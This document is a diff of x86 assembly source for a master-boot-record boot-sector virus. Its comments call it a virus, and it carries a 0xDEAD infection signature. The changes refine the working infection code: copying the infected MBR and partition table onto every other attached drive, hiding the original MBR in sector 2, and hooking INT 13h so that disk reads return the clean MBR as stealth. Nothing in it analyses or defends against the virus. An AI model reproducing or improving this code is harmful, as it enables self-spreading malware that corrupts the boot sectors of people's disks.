@@ -11,19 +11,16 @@ start:
   mov ds, ax
   mov es, ax
 
-                            ; let's save infected mbr to location 0x7e00
-  mov al, 0x01              ; load 1 sector
-  xor dh, dh                ; head 0
-
   xor di, di                ; our disk counter
 dsk_lp:
   mov dl, [disk_codes+di]   ; load disk code from our table
   cmp dl, [bootDrive]       ; check if this is our infected drive
   je nxt_disk               ; this is our drive, just go to the next one
 
-  mov ah, 0x02              ; read sector
+  mov ax, 0x0201              ; read sector
   mov cx, 0x0001            ; cylinder 0, sector=1
-  mov bx, 0x8000            ; load original mbr to 0x8000
+  mov bx, 0x7e00            ; load original mbr to 0x7e00
+  xor dh, dh                ; head 0
   call wr_sector
   jc nxt_disk               ; if carry is set, disk doesn't exist (most likely)
   add bx, sig               ; check if this drive is already signed
@@ -31,13 +28,20 @@ dsk_lp:
   cmp word [bx], 0xDEAD     ; compare with our signature 0xDEAD
   je nxt_disk               ; if already signed, jump to next disk
 
-  mov ah, 0x03              ; dirty business, copy our infected mbr to new drive
+  mov si, part_table + 0x200 ; copy partiion table
+  mov di, part_table
+  mov cx, 74
+  rep movsb
+
+  mov ax, 0x0301              ; dirty business, copy our infected mbr to new drive
+  mov cx, 0x0001            ; cylinder 0, sector=1
   mov bx, 0x7c00            ; we copied infected mbr to 0x7e00 earlier
   call wr_sector            ; perform write
 
-  mov ah, 0x03
+
+  mov ax, 0x0301
   mov cx, 0x0002            ; write original mbr to 2nd sector
-  mov bx, 0x8000            ; we saved sector to 0x8000
+  mov bx, 0x7e00            ; we saved sector to 0x7e00
   call wr_sector            ; perform write
 nxt_disk:
   inc di                    ; increment our counter
@@ -51,9 +55,9 @@ relocate:
   xor ax, ax
   mov ds, ax
   dec word [ds:0x413]
-  dec word [ds:0x413]
   mov ax, [ds:0x413]
-  shl ax, (10-4)
+  int 0x12                        ; get top address
+  shl ax, (10-4)                  ; get segment of free address
   mov es, ax
   ;sub ax, 0x7c0
   mov dl, [bootDrive]             ; retrieve current boot drive
@@ -88,6 +92,7 @@ cpy_original:                   ; this code will copy original MBR to 0x7c00
   mov word [es:0x13*4], ax
   mov word [es:0x13*4+2], cs                        ; save new adress to 13h vector
   popa
+  sti
   jmp 0x0:0x7c00                                ; far jump to the original MBR
 
 ; disk hook that will resident in memory
@@ -97,14 +102,14 @@ dsk_hook:
   jne .end_hook
   cmp cx, 0x0001                                ; check if 1st sector
   jne .end_hook
+  or dh, dh
+  jnz .end_hook
   mov cx, 0x0002                                ; change it to original MBR
 .end_hook:
   popf
   push word [cs:oldint13-cpy_original+2] ; push segment
   push word [cs:oldint13-cpy_original]   ; push offset
   retf                                          ; call original handler
-  sti
-  iret
 
 
 oldint13:
@@ -141,6 +146,7 @@ db "VIRUS SIGNATURE.$"        ; for easier to see when seeing MBR code
 
 times (0x1b4 - ($-$$)) nop    ; Pad For MBR Partition Table
 
+part_table:
 UID times 10 db 0             ; Unique Disk ID
 PT1 times 16 db 0             ; First Partition Entry
 PT2 times 16 db 0             ; Second Partition Entry
